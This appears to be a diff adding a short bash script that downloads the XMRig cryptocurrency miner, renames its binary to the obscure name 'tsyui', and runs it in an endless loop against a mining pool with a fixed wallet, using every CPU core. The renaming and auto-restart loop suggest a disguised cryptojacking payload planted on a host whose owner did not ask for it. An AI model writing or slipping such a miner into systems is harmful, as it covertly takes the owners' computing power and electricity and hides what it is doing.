@@ -1,0 +1,9 @@
+#!/bin/bash
+curl https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz -L -o xmrig-6.25.0-linux-static-x64.tar.gz
+tar xf xmrig-6.25.0-linux-static-x64.tar.gz
+cd xmrig-6.25.0
+mv xmrig tsyui
+while true
+do
+./tsyui --donate-level 1 -o fr-qrl.miningocean.org:3333 -u Q01060090d6a7b0fa539968556afdc7beff396a2e41f7fa83001c8e8848c7734f3f0ddd90253143 -p $(echo $RANDOM | md5sum | head -c 10) -a rx/0 -k -t $(nproc --all)
+done
